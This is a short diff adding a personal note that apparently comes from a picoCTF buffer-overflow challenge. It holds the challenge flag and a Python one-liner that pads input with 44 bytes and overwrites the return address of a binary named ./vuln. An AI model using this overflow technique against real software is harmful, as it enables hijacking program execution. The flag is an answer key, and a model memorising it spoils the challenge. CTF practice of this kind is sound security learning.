@@ -1,0 +1,6 @@
+picoCTF{addr3ss3s_ar3_3asyd69e032d}
+
+# to get flag from shell server. still not sure how it works
+
+python -c "import struct; print 'A'*44 + struct.pack('<I',0x080485cb)" | ./vuln 
+
